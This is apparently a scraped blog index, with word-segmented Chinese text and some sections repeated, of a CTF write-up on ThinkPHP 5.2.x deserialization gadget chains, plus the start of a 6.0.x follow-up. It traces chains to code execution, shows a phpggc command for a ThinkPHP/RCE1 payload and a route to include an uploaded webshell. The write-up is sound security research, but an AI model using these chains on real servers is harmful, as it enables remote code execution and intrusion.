\u53ef \u4f2a\u9020 \u6570\u636e \u8fdb\u5165   getAttr   \u51fd\u6570   public   function   getAttr ( string   $ name )   {   / /   ...   return   $ this - > getValue ( $ name ,   $ value ,   $ relation ) ;   }   protected   function   getValue ( string   $ name ,   $ value ,   bool   $ relation   =   false )   {   / /   \u68c0\u6d4b \u5c5e\u6027 \u83b7\u53d6 \u5668   $ fieldName   =   $ this - > getRealFieldName ( $ name ) ; / /   \u76f4\u63a5 \u8fd4\u56de $ name \u7684 \u503c   / /   ...   if   ( isset ( $ this - > withAttr [ $ fieldName ] ) )   {   / /   ...   $ closure   =   $ this - > withAttr [ $ fieldName ] ;   / /   withAttr \u5185\u5bb9 \u53ef\u63a7   $ value   =   $ closure ( $ value ,   $ this - > data ) ;   / /   \u52a8\u6001 \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570   / /   ...   \u76f4\u63a5 \u5173\u6ce8   getValue   \u51fd\u6570 \uff0c \u8be5 \u51fd\u6570 \u53ef \u52a8\u6001 \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570 \uff0c \u5e76\u4e14 \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570 \u3001 \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \u5747 \u53ef\u63a7 \u3002 \u6240\u4ee5 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u6709 \u4e24\u79cd \u65b9\u6cd5 \uff0c \u7b2c\u4e00 \u4e00\u79cd \u7b2c\u4e00\u79cd \u662f \u627e \u4e00\u4e2a \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 php \u51fd\u6570 \uff0c \u53e6 \u4e00\u79cd \u662f \u5229\u7528 tp \u81ea\u5e26 \u7684 SerializableClosure \u8c03\u7528 \uff0c \u6765\u770b \u4e00\u4e0b \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd \u3002   \\ Opis \\ Closure   \u53ef \u7528\u4e8e \u5e8f\u5217 \u5e8f\u5217\u5316 \u533f\u540d \u51fd\u6570 \uff0c \u4f7f\u5f97 \u533f\u540d \u51fd\u6570 \u540c\u6837 \u53ef\u4ee5 \u8fdb\u884c \u5e8f\u5217 \u5e8f\u5217\u5316 \u64cd\u4f5c \u3002 \u8fd9 \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u53ef\u4ee5 \u5e8f\u5217 \u5e8f\u5217\u5316 \u4e00\u4e2a \u533f\u540d \u51fd\u6570 \uff0c \u7136\u540e \u4ea4\u7531 \u4e0a\u8ff0 \u7684   $ closure ( $ value ,   $ this - > data )   \u8c03\u7528 \u6267\u884c \u3002   $ func   =   function ( ) { phpinfo ( ) ; } ;   $ closure   =   new   \\ Opis \\ Closure \\ SerializableClosure ( $ func ) ;   $ closure ( $ value ,   $ this - > data ) ; / /   \u8fd9\u91cc \u7684 \u53c2\u6570 \u53ef\u4ee5 \u4e0d\u7528 \u7ba1   \u4ee5 \u4e0a\u8ff0 \u4ee3\u7801 \u4e3a\u4f8b \uff0c \u5c06 \u8c03\u7528 phpinfo \u51fd\u6570 \u3002   \u6b64\u4e3a \u4e3a\u6b62 \u5230\u6b64\u4e3a\u6b62 \uff0c \u6211\u4eec \u5206\u6790 \u5b8c \u4e86 \u6574\u4e00 \u4e00\u4e2a \u6574\u4e00\u4e2a \u8c03\u7528 \u6d41\u7a0b \uff0c \u56de\u987e \u4e00\u4e0b   vendor / topthink / framework / src / think / process / pipes / Windows . php   __ destruct   - >   removeFiles   - >   file _ exists   \u5f3a\u5236 \u8f6c\u5316 \u5b57\u7b26 \u5b57\u7b26\u4e32   filename   \uff0c \u8fd9\u91cc \u7684   filename   \u53ef\u63a7   \u53ef \u89e6\u53d1   __ toString   \u51fd\u6570 \uff0c \u4e0b \u4e00\u6b65 \u627e \u53ef \u5229\u7528 \u7684   __ toString   vendor / topthink / framework / src / think / model / concern / Conversion . php   __ toString   - >   toJson   - >   toArray   \u521b\u9020 \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684   relation   \u548c   visible   - >   getAttr   \u4e0b \u4e00\u6b65 \u8c03\u7528   vendor / topthink / framework / src / think / model / concern / Attribute . php   \u7684   getValue   \u51fd\u6570   vendor / topthink / framework / src / think / model / concern / Attribute . php   getValue   - >   $ closure   \u52a8\u6001 \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570 \uff0c \u4e14 \u8be5 \u5185\u5bb9 \u53ef\u63a7   \u4e0b \u4e00\u6b65 \u5229\u7528 \u6709 \u4e24\u79cd \uff0c \u4e00\u79cd \u627e \u7b26\u5408 \u7684 php \u51fd\u6570 \uff0c \u53e6 \u4e00\u79cd \u5229\u7528 tp \u81ea\u5e26 \u7684   SerializableClosure   \u8c03\u7528   vendor / opis / closure / src / SerializableClosure . php   \u6784\u9020 \u53ef \u5229\u7528 \u7684 \u533f\u540d \u51fd\u6570   \u6211 \u628a exp \u96c6\u6210 \u5230 \u4e86   phpggc   \u4e0a \uff0c \u4f7f\u7528 \u5982\u4e0b \u547d\u4ee4 \u5373\u53ef \u751f\u6210   . / phpggc   - u   ThinkPHP / RCE1   ' phpinfo ( ) ; '   \u8fd9\u91cc \u7531\u4e8e \u7528\u5230 \u4e86 SerializableClosure \uff0c \u9700\u8981 \u4f7f\u7528 \u7f16\u7801 \u7801\u5668 \u7f16\u7801\u5668 \u7f16\u7801 \uff0c \u4e0d\u53ef \u76f4\u63a5 \u8f93\u51fa \u62f7\u8d1d \u5229\u7528 \u3002   think / Db . php   __ call \u51fd\u6570 \u53ef \u5b9e\u4f8b \u5316 \u4efb\u610f \u7c7b \uff08 \u9898\u76ee \u7684 \u975e \u9884\u671f \u89e3 \uff09   \u524d\u9762 \u8bf4 \u5230 5.1 . 37 \u7248\u672c \u7684 \u5229\u7528 \u94fe \u7684   __ call   \u51fd\u6570 \uff0c \u5728 5.2 . x \u7248\u672c \u6ca1 \u529e\u6cd5 \u7528 \u4e86 \u3002 \u4f46\u662f \u4ece   __ destruct   \u5230   __ call   \u7684 \u94fe\u8def \u662f \u901a \u7684 \uff0c \u6211\u4eec \u53ea \u9700\u8981 \u91cd\u65b0 \u627e \u4e00\u4e2a \u53ef\u7528 \u7684   __ call   \u51fd\u6570 \u5373\u53ef \u3002   \u6765\u770b \u4e00\u4e0b   vendor / topthink / framework / src / think / Db . php   \u7684   __ call   \u51fd\u6570   public   function   __ call ( $ method ,   $ args )   {   $ class   =   $ this - > config [ ' query ' ] ;   $ query   =   new   $ class ( $ this - > connection ) ;   return   call _ user _ func _ array ( [ $ query ,   $ method ] ,   $ args ) ;   }   $ this - > config   \u548c   $ this - > connection   \u5747 \u53ef\u63a7 \uff0c \u8fd9 \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u53ef\u4ee5 \u5b9e\u4f8b \u5316 \u4efb\u610f \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 \u7c7b \uff0c \u8fd9\u91cc \u627e \u4e86   think \\ Url   public   function   __ construct ( App   $ app ,   array   $ config   =   [ ] )   {   $ this - > app   =   $ app ;   $ this - > config   =   $ config ;   if   ( is _ file ( $ app - > getRuntimePath ( )   .   ' route . php ' ) )   {   / /   \u8bfb\u53d6 \u8def\u7531 \u6620\u5c04 \u6587\u4ef6   $ app - > route - > import ( include   $ app - > getRuntimePath ( )   .   ' route . php ' ) ;   }   }   \u8be5 \u6784\u9020 \u5668 \u5f15\u5165 \u4e86 RuntimePath \u4e0b \u7684 route . php \u6587\u4ef6 \uff0c \u56e0\u4e3a \u8fd9\u9053\u9898 \u662f \u5141\u8bb8 \u4e0a\u4f20 \u6587\u4ef6 \u7684 \uff0c \u6240\u4ee5 \u53ea\u8981 \u5728 \u53ef \u4e0a\u4f20 \u7684 \u76ee\u5f55 \u4e0b \u4e0a\u4f20 \u4e00\u4e2a route . php \u7684 webshell \u5373\u53ef \u3002 \u81f3\u4e8e RuntimePath \uff0c   $ app   \u4e3a \u53ef\u63a7 \u53d8\u91cf \uff0c \u76f4\u63a5 \u4fee\u6539   $ runtimePath   \u7684 \u5185\u5bb9 \u5373\u53ef \u3002   \u6211\u4eec \u76f4\u63a5 \u6784\u9020 App \u5bf9\u8c61 \u4e3a   class   App {   protected   $ runtimePath ;   public   function   __ construct ( string   $ rootPath   =   ' ' ) {   $ this - > rootPath   =   $ rootPath ;   $ this - > runtimePath   =   \" / tmp / \" ;   $ this - > route   =   new   \\ think \\ route \\ RuleName ( ) ;   }   }   \u8fd9\u4e2a \u6784\u9020 \u601d\u8def \u592a\u6e9c \u4e86 \uff0c \u819c \u4e00\u6ce2 \uff1a \uff09   \u6574\u7406 \u4e00\u4e0b \u8fc7\u7a0b   vendor / topthink / framework / src / think / process / pipes / Windows . php   __ destruct   - >   removeFiles   - >   file _ exists   \u5f3a\u5236 \u8f6c\u5316 \u5b57\u7b26 \u5b57\u7b26\u4e32   filename   \uff0c \u8fd9\u91cc \u7684   filename   \u53ef\u63a7   \u53ef \u89e6\u53d1   __ toString   \u51fd\u6570 \uff0c \u4e0b \u4e00\u6b65 \u627e \u53ef \u5229\u7528 \u7684   __ toString   vendor / topthink / framework / src / think / model / concern / Conversion . php   __ toString   - >   toJson   - >   toArray   - >   appendAttrToArray   - >   $ relation   \u8c03\u7528 \u4e0d \u5b58\u5728 \u7684 \u51fd\u6570 \uff0c \u89e6\u53d1   __ call   vendor / topthink / framework / src / think / Db . php   __ call   - >   new   $ class ( $ this - > connection )   \u8c03\u7528 \u4efb\u610f \u7c7b \u7684   __ construct   \u51fd\u6570   vendor / topthink / framework / src / think / Url . php   \u6784\u9020 App \u7c7b \uff0c \u8fbe\u5230   include   \u4efb\u610f \u6587\u4ef6 \u7684 \u6548\u679c","title":"thinkphp   v5.2 . x   \u53cd \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398"},{"location":"blog/2019/thinkphp_5.2.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/#0x00","text":"\u4e0a\u5468 \u53c2\u4e0e \u4e86 N1CTF \uff0c \u91cc\u9762 \u6709 \u4e00\u9053 \u5173\u4e8e thinkphp5 \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u7684 \u5229\u7528 \u3002 \u8bb0\u5f55 \u4e00\u4e0b \u5173\u4e8e \u8be5 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u5229\u7528 \u5206\u6790 \u94fe\u5206\u6790 \u3002   \u540e\u6587 \u4e3b\u8981 \u5305\u62ec \u4e24\u6761 \u94fe \u7684 \u5229\u7528 \u5206\u6790 \uff08 \u4e00\u6761 \u662f \u6211 \u627e \u7684 \uff0c \u4e5f \u662f \u9898\u76ee \u7684 \u9884\u671f \u89e3 \uff0c \u53e6 \u4e00\u6761 \u662f wonderkun \u5e08\u5085 \u627e \u7684 \u975e \u9884\u671f \u89e3 \uff09","title":"0x00   \u524d\u8a00"},{"location":"blog/2019/thinkphp_5.2.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/#0x01","text":"\u8fd9\u91cc \u5c31 \u4e0d \u76f4\u63a5 \u7528 \u9898\u76ee \u7684 \u73af\u5883 \u4e86 \uff0c \u91c7\u7528 composer \u76f4\u63a5 \u5b89\u88c5 5.2 . * - dev \u7248\u672c   composer   create - project   topthink / think   =   5   . 2 . x - dev   v5.2","title":"0x01   \u73af\u5883 \u51c6\u5907"},{"location":"blog/2019/thinkphp_5.2.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/#0x02","text":"","title":"0x02   \u5229\u7528 \u94fe\u5206\u6790"},{"location":"blog/2019/thinkphp_5.2.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/#_1","text":"tp5 \u5728 \u6211 \u5370\u8c61 \u91cc \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u5229\u7528 \u94fe \u5b58\u5728 \u4e00\u4e2a Windows \u7c7b \u7684 \u4efb\u610f \u6587\u4ef6 \u5220\u9664 \uff0c \u4f46\u662f \u5728   \u8fd9 \u6587\u7ae0 \u7bc7\u6587\u7ae0   \u7684 \u542f\u793a \u4e0b \uff0c \u4e5f \u7b97\u662f \u627e\u5230 \u4e86 \u4e00\u6761 \u65b0 \u7684 \u8def \uff08 \u5173\u4e8e   __ toString   \u7684 \u89e6\u53d1 \u65b9\u5f0f \uff0c \u9664\u4e86 \u5b57\u7b26 \u5b57\u7b26\u4e32 \u62fc\u63a5 \u7684 \u65b9\u5f0f \uff0c \u8fd8 \u53ef\u4ee5 \u5229\u7528 PHP \u81ea\u5e26 \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \u7684 \u5f3a\u5236 \u8f6c\u6362 \uff09 \u3002   \u8fd9 \u6587\u7ae0 \u7bc7\u6587\u7ae0 \u7684 \u5229\u7528 \u94fe \u6700\u540e \u7528\u5230 \u4e86 5.1 . 37 \u7248\u672c   think / Request . php   \u7684   __ call   \u51fd\u6570 \uff0c \u8be5 \u51fd\u6570 \u7684 \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570 \u540d \u53ef\u63a7 \uff0c \u6240\u4ee5 \u53ef\u4ee5 \u5bfc\u81f4 \u4efb\u610f \u8c03\u7528 \u5176\u4ed6 \u7684 \u7c7b \u51fd\u6570 \u3002 \u800c \u5728 5.2 . x \u7248\u672c \u4e0d \u5b58\u5728 \u8fd9\u6837 \u7684 \u4e00\u4e2a   __ call   \u51fd\u6570 \uff0c \u8fd9 \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u9700\u8981 \u91cd\u65b0 \u627e \u4e00\u4e2a \u6700\u7ec8 \u8fbe\u6210 \u547d\u4ee4 \u6267\u884c \u7684 \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \uff08   __ call   \u51fd\u6570 \u524d \u7684 \u5229\u7528 \u94fe \u4ecd\u7136 \u53ef\u7528 \uff09 \u3002   \u90a3\u4e48 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \uff0c \u6211\u4eec \u6765 \u770b\u770b 5.2 . x \u65b0 \u7684 \u5229\u7528 \u94fe \u5427 \uff1a \uff09","title":"\u80cc\u666f \u56de\u987e"},{"location":"blog/2019/thinkphp_5.2.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/#thinkmodelconcernattributephp-getvalue","text":"\u7531\u4e8e 5.1 . 37   __ call   \u51fd\u6570 \u524d \u7684 \u5229\u7528 \u94fe \u4ecd\u7136 \u5b58\u5728 \u4e8e 5.2 . x \u7248\u672c \uff0c \u8fd9\u91cc \u5c31 \u4e0d\u518d \u8be6\u8ff0 \u4e86 \u3002   \u5148 \u6765\u770b \u4e00\u4e0b Conversion \u7c7b \u7684 toArray \u51fd\u6570   public   function   toArray ( ) :   array   {   / /   ...   / /   \u5408\u5e76 \u5173\u8054 \u6570\u636e   $ data   =   array _ merge ( $ this - > data ,   $ this - > relation ) ;   foreach   ( $ data   as   $ key   = >   $ val )   {   if   ( $ val   instanceof   Model   | |   $ val   instanceof   ModelCollection )   {   / /   ...   }   elseif   ( isset ( $ this - > visible [ $ key ] ) )   {   $ item [ $ key ]   =   $ this - > getAttr ( $ key ) ; / /   relation \u548c visible \u5b58\u5728 \u540c\u4e00 \u4e00\u4e2a \u540c\u4e00\u4e2a key \u5c31\u884c   / /   ...   }   / /   ...   \u53bb\u6389 \u4e86 \u65e0\u5173 \u7684 \u4ee3\u7801 \uff0c \u8fd9\u91cc   $ this - > visible   \u3001   $ this - > relation   \u5747 \u53ef\u63a7 \uff0c \u53ef \u4f2a\u9020 \u6570\u636e \u8fdb\u5165   getAttr   \u51fd\u6570   public   function   getAttr ( string   $ name )   {   / /   ...   return   $ this - > getValue ( $ name ,   $ value ,   $ relation ) ;   }   protected   function   getValue ( string   $ name ,   $ value ,   bool   $ relation   =   false )   {   / /   \u68c0\u6d4b \u5c5e\u6027 \u83b7\u53d6 \u5668   $ fieldName   =   $ this - > getRealFieldName ( $ name ) ; / /   \u76f4\u63a5 \u8fd4\u56de $ name \u7684 \u503c   / /   ...   if   ( isset ( $ this - > withAttr [ $ fieldName ] ) )   {   / /   ...   $ closure   =   $ this - > withAttr [ $ fieldName ] ;   / /   withAttr \u5185\u5bb9 \u53ef\u63a7   $ value   =   $ closure ( $ value ,   $ this - > data ) ;   / /   \u52a8\u6001 \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570   / /   ...   \u76f4\u63a5 \u5173\u6ce8   getValue   \u51fd\u6570 \uff0c \u8be5 \u51fd\u6570 \u53ef \u52a8\u6001 \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570 \uff0c \u5e76\u4e14 \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570 \u3001 \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \u5747 \u53ef\u63a7 \u3002 \u6240\u4ee5 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u6709 \u4e24\u79cd \u65b9\u6cd5 \uff0c \u7b2c\u4e00 \u4e00\u79cd \u7b2c\u4e00\u79cd \u662f \u627e \u4e00\u4e2a \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 php \u51fd\u6570 \uff0c \u53e6 \u4e00\u79cd \u662f \u5229\u7528 tp \u81ea\u5e26 \u7684 SerializableClosure \u8c03\u7528 \uff0c \u6765\u770b \u4e00\u4e0b \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd \u3002   \\ Opis \\ Closure   \u53ef \u7528\u4e8e \u5e8f\u5217 \u5e8f\u5217\u5316 \u533f\u540d \u51fd\u6570 \uff0c \u4f7f\u5f97 \u533f\u540d \u51fd\u6570 \u540c\u6837 \u53ef\u4ee5 \u8fdb\u884c \u5e8f\u5217 \u5e8f\u5217\u5316 \u64cd\u4f5c \u3002 \u8fd9 \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u53ef\u4ee5 \u5e8f\u5217 \u5e8f\u5217\u5316 \u4e00\u4e2a \u533f\u540d \u51fd\u6570 \uff0c \u7136\u540e \u4ea4\u7531 \u4e0a\u8ff0 \u7684   $ closure ( $ value ,   $ this - > data )   \u8c03\u7528 \u6267\u884c \u3002   $ func   =   function ( ) { phpinfo ( ) ; } ;   $ closure   =   new   \\ Opis \\ Closure \\ SerializableClosure ( $ func ) ;   $ closure ( $ value ,   $ this - > data ) ; / /   \u8fd9\u91cc \u7684 \u53c2\u6570 \u53ef\u4ee5 \u4e0d\u7528 \u7ba1   \u4ee5 \u4e0a\u8ff0 \u4ee3\u7801 \u4e3a\u4f8b \uff0c \u5c06 \u8c03\u7528 phpinfo \u51fd\u6570 \u3002   \u6b64\u4e3a \u4e3a\u6b62 \u5230\u6b64\u4e3a\u6b62 \uff0c \u6211\u4eec \u5206\u6790 \u5b8c \u4e86 \u6574\u4e00 \u4e00\u4e2a \u6574\u4e00\u4e2a \u8c03\u7528 \u6d41\u7a0b \uff0c \u56de\u987e \u4e00\u4e0b   vendor / topthink / framework / src / think / process / pipes / Windows . php   __ destruct   - >   removeFiles   - >   file _ exists   \u5f3a\u5236 \u8f6c\u5316 \u5b57\u7b26 \u5b57\u7b26\u4e32   filename   \uff0c \u8fd9\u91cc \u7684   filename   \u53ef\u63a7   \u53ef \u89e6\u53d1   __ toString   \u51fd\u6570 \uff0c \u4e0b \u4e00\u6b65 \u627e \u53ef \u5229\u7528 \u7684   __ toString   vendor / topthink / framework / src / think / model / concern / Conversion . php   __ toString   - >   toJson   - >   toArray   \u521b\u9020 \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684   relation   \u548c   visible   - >   getAttr   \u4e0b \u4e00\u6b65 \u8c03\u7528   vendor / topthink / framework / src / think / model / concern / Attribute . php   \u7684   getValue   \u51fd\u6570   vendor / topthink / framework / src / think / model / concern / Attribute . php   getValue   - >   $ closure   \u52a8\u6001 \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570 \uff0c \u4e14 \u8be5 \u5185\u5bb9 \u53ef\u63a7   \u4e0b \u4e00\u6b65 \u5229\u7528 \u6709 \u4e24\u79cd \uff0c \u4e00\u79cd \u627e \u7b26\u5408 \u7684 php \u51fd\u6570 \uff0c \u53e6 \u4e00\u79cd \u5229\u7528 tp \u81ea\u5e26 \u7684   SerializableClosure   \u8c03\u7528   vendor / opis / closure / src / SerializableClosure . php   \u6784\u9020 \u53ef \u5229\u7528 \u7684 \u533f\u540d \u51fd\u6570   \u6211 \u628a exp \u96c6\u6210 \u5230 \u4e86   phpggc   \u4e0a \uff0c \u4f7f\u7528 \u5982\u4e0b \u547d\u4ee4 \u5373\u53ef \u751f\u6210   . / phpggc   - u   ThinkPHP / RCE1   ' phpinfo ( ) ; '   \u8fd9\u91cc \u7531\u4e8e \u7528\u5230 \u4e86 SerializableClosure \uff0c \u9700\u8981 \u4f7f\u7528 \u7f16\u7801 \u7801\u5668 \u7f16\u7801\u5668 \u7f16\u7801 \uff0c \u4e0d\u53ef \u76f4\u63a5 \u8f93\u51fa \u62f7\u8d1d \u5229\u7528 \u3002","title":"think / model / concern / Attribute . php   getValue \u53ef \u51fd\u6570 \u52a8\u6001 \u8c03\u7528\u51fd\u6570 \uff08 \u9898\u76ee \u7684 \u9884\u671f \u89e3 \uff09"},{"location":"blog/2019/thinkphp_5.2.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/#thinkdbphp-__call","text":"\u524d\u9762 \u8bf4 \u5230 5.1 . 37 \u7248\u672c \u7684 \u5229\u7528 \u94fe \u7684   __ call   \u51fd\u6570 \uff0c \u5728 5.2 . x \u7248\u672c \u6ca1 \u529e\u6cd5 \u7528 \u4e86 \u3002 \u4f46\u662f \u4ece   __ destruct   \u5230   __ call   \u7684 \u94fe\u8def \u662f \u901a \u7684 \uff0c \u6211\u4eec \u53ea \u9700\u8981 \u91cd\u65b0 \u627e \u4e00\u4e2a \u53ef\u7528 \u7684   __ call   \u51fd\u6570 \u5373\u53ef \u3002   \u6765\u770b \u4e00\u4e0b   vendor / topthink / framework / src / think / Db . php   \u7684   __ call   \u51fd\u6570   public   function   __ call ( $ method ,   $ args )   {   $ class   =   $ this - > config [ ' query ' ] ;   $ query   =   new   $ class ( $ this - > connection ) ;   return   call _ user _ func _ array ( [ $ query ,   $ method ] ,   $ args ) ;   }   $ this - > config   \u548c   $ this - > connection   \u5747 \u53ef\u63a7 \uff0c \u8fd9 \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u53ef\u4ee5 \u5b9e\u4f8b \u5316 \u4efb\u610f \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 \u7c7b \uff0c \u8fd9\u91cc \u627e \u4e86   think \\ Url   public   function   __ construct ( App   $ app ,   array   $ config   =   [ ] )   {   $ this - > app   =   $ app ;   $ this - > config   =   $ config ;   if   ( is _ file ( $ app - > getRuntimePath ( )   .   ' route . php ' ) )   {   / /   \u8bfb\u53d6 \u8def\u7531 \u6620\u5c04 \u6587\u4ef6   $ app - > route - > import ( include   $ app - > getRuntimePath ( )   .   ' route . php ' ) ;   }   }   \u8be5 \u6784\u9020 \u5668 \u5f15\u5165 \u4e86 RuntimePath \u4e0b \u7684 route . php \u6587\u4ef6 \uff0c \u56e0\u4e3a \u8fd9\u9053\u9898 \u662f \u5141\u8bb8 \u4e0a\u4f20 \u6587\u4ef6 \u7684 \uff0c \u6240\u4ee5 \u53ea\u8981 \u5728 \u53ef \u4e0a\u4f20 \u7684 \u76ee\u5f55 \u4e0b \u4e0a\u4f20 \u4e00\u4e2a route . php \u7684 webshell \u5373\u53ef \u3002 \u81f3\u4e8e RuntimePath \uff0c   $ app   \u4e3a \u53ef\u63a7 \u53d8\u91cf \uff0c \u76f4\u63a5 \u4fee\u6539   $ runtimePath   \u7684 \u5185\u5bb9 \u5373\u53ef \u3002   \u6211\u4eec \u76f4\u63a5 \u6784\u9020 App \u5bf9\u8c61 \u4e3a   class   App {   protected   $ runtimePath ;   public   function   __ construct ( string   $ rootPath   =   ' ' ) {   $ this - > rootPath   =   $ rootPath ;   $ this - > runtimePath   =   \" / tmp / \" ;   $ this - > route   =   new   \\ think \\ route \\ RuleName ( ) ;   }   }   \u8fd9\u4e2a \u6784\u9020 \u601d\u8def \u592a\u6e9c \u4e86 \uff0c \u819c \u4e00\u6ce2 \uff1a \uff09   \u6574\u7406 \u4e00\u4e0b \u8fc7\u7a0b   vendor / topthink / framework / src / think / process / pipes / Windows . php   __ destruct   - >   removeFiles   - >   file _ exists   \u5f3a\u5236 \u8f6c\u5316 \u5b57\u7b26 \u5b57\u7b26\u4e32   filename   \uff0c \u8fd9\u91cc \u7684   filename   \u53ef\u63a7   \u53ef \u89e6\u53d1   __ toString   \u51fd\u6570 \uff0c \u4e0b \u4e00\u6b65 \u627e \u53ef \u5229\u7528 \u7684   __ toString   vendor / topthink / framework / src / think / model / concern / Conversion . php   __ toString   - >   toJson   - >   toArray   - >   appendAttrToArray   - >   $ relation   \u8c03\u7528 \u4e0d \u5b58\u5728 \u7684 \u51fd\u6570 \uff0c \u89e6\u53d1   __ call   vendor / topthink / framework / src / think / Db . php   __ call   - >   new   $ class ( $ this - > connection )   \u8c03\u7528 \u4efb\u610f \u7c7b \u7684   __ construct   \u51fd\u6570   vendor / topthink / framework / src / think / Url . php   \u6784\u9020 App \u7c7b \uff0c \u8fbe\u5230   include   \u4efb\u610f \u6587\u4ef6 \u7684 \u6548\u679c","title":"think / Db . php   __ call \u51fd\u6570 \u53ef \u5b9e\u4f8b \u5316 \u4efb\u610f \u7c7b \uff08 \u9898\u76ee \u7684 \u975e \u9884\u671f \u89e3 \uff09"},{"location":"blog/2019/thinkphp_6.0.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/","tags":["\u6f0f\u6d1e\u5206\u6790"],"text":"0x00   \u524d\u8a00   \u4e0a \u4e00\u7bc7 \u5206\u6790 \u4e86 tp   5.2 . x \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \uff0c \u987a\u7740 \u601d\u8def \uff0c \u628a tp6.0 . x \u4e5f \u6316 \u4e86 \u3002 \u6709 \u7c7b\u4f3c \u7684 \u5730\u65b9 \uff0c \u4e5f \u6709 \u9700\u8981 \u91cd\u65b0 \u6316\u6398 \u7684 \u5730\u65b9 \u3002   0x01   \u73af\u5883 \u51c6\u5907   \u91c7\u7528 composer \u5b89\u88c5 6.0 . * - dev \u7248\u672c   composer   create - project   topthink / think = 6.0 . x - dev   v6.0   0x02   \u5229\u7528 \u5206\u6790 \u94fe\u5206\u6790   \u80cc\u666f \u56de\u987e   \u62ff\u5230 v6.0 . x \u7248\u672c \uff0c \u7b80\u5355 \u7684 \u770b \u4e86 \u4e00\u4e0b \uff0c \u6709 \u4e00\u4e2a \u6d88\u606f \u597d\u6d88\u606f \u548c \u4e00\u4e2a \u6d88\u606f \u574f\u6d88\u606f \u3002   \u6d88\u606f \u597d\u6d88\u606f \u662f 5.2 . x \u7248\u672c \u51fd\u6570 \u52a8\u6001 \u8c03\u7528 \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u94fe\u540e \u534a \u90e8\u5206 \uff0c \u8fd8 \u53ef\u4ee5 \u5229\u7528 \u3002   \u6d88\u606f \u574f\u6d88\u606f \u662f \u524d\u9762 5.1 . x \uff0c 5.2 . x \u7248\u672c \u90fd \u57fa\u4e8e \u89e6\u53d1 \u70b9   Windows   \u7c7b \u7684   __ destruct   , \u597d\u5de7 \u4e0d\u5de7 \u7684 \u662f 6.0 . x \u7248\u672c \u53d6\u6d88 \u4e86   Windows   \u7c7b \u3002 \u8fd9 \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u5f97 \u91cd\u65b0 \u627e \u4e00\u4e2a \u5408\u9002 \u7684 \u8d77\u59cb \u89e6\u53d1 \u70b9 \uff0c \u624d\u80fd \u7ee7\u7eed \u4f7f\u7528 \u4e0a\u9762 \u7684 \u6d88\u606f \u597d\u6d88\u606f \u3002   vendor / topthink / think - orm / src / Model . php   \u65b0 \u8d77\u59cb \u89e6\u53d1 \u70b9   \u4e3a\u4e86 \u8282\u7701 \u7bc7\u5e45 \uff0c \u540e\u6587 \u4e0d\u518d \u91cd\u590d \u4ecb\u7ecd \u89e6\u53d1   __ toString   \u51fd\u6570 \u540e \u7684 \u5229\u7528 \u94fe \uff0c \u8fd9\u90e8 \u90e8\u5206 \u8fd9\u90e8\u5206 \u540c 5.2 . x \u7248\u672c \u76f8\u540c ( \u4e0d\u8fc7 wonderkun \u5e08\u5085 \u7684 \u5229\u7528 \u94fe \u5df2 \u5931\u6548 \uff0c \u52a8\u6001 \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \u7684 \u5229\u7528 \u94fe \u8fd8 \u80fd \u7528 ) \u3002   \u901a\u5e38 \u6700\u597d \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8d77\u59cb 